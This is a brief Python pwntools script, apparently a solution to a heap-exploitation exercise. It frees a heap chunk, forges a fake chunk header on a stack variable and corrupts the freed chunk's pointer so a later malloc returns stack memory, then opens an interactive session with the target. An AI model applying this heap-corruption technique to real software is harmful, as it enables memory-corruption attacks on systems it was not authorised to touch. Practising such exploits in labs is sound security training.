from pwn import *
from handle import *

def exploit():
	malloc(0x100)
	malloc(0x10)

	free_chunk(0)

	stack = stack_var_1_address()
	write_to_stack_var_1(p64(0) + p64(0x90) + p64(0) + p64(stack))
	write_to_chunk(0, p64(0) + p64(stack))

	malloc(0x80)

p = exec_file(1)
exploit()
p.interactive()
p.close()
